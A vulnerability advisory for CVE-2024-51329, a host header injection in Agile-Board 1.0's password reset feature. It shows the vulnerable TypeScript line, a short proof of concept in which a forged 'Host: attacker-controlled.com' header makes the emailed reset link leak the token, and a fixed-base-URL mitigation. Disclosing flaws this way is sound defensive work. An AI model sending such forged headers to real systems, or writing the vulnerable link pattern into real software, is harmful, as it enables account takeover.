# CVE-2024-51329: Host Header Injection in Agile Board 1.0

A Host Header Injection vulnerability in Agile-Board 1.0 allows attackers to obtain password reset token via user interaction wth a crafted password reset link.

Vulnerable code:
```ts
    //host header is used to construct link !
    const resetLink = `http://${req.headers.host}/password-reset?userId=${user.id}&token=${token}`;

    const emailOptions = {
      recipient: user.email,
      subject: 'Password Reset',
      content: `Please click on the following link to reset your password: ${resetLink}`,
    };

```

 
## Proof-of-concept:

* We trigger the forgot password functionality for an existing user, such as `victim1@email.com`, and provide a malicious host header: `Host: attacker-controlled.com`.
* This sends a password reset email to staff1@email.com that contains the following:
```plaintext
Please click on the following link to reset your password: https://attacker-controlled.com/password-reset?userId=<USERID>&token=<TOKENHERE>
```

* Note the host being `attacker-controlled.com`.
* When user `victim1` clicks the link and attempts to use the password reset token, the token is leaked to the attacker, allowing the attacker to reset and takeover `victim`'s account.



## Mitigation:
* Use a configuration setting or an environment variable for the base URL (e.g., BASE_URL), which ensures that your application uses a known and trusted domain.
* Replace req.headers.host with the predefined BASE_URL.

<br><br>

**Discovered by Anirudh Krishnaprasad, October 2024.**

## References :

- [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-51329](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-51329)
- https://nvd.nist.gov/vuln/detail/CVE-2024-51329
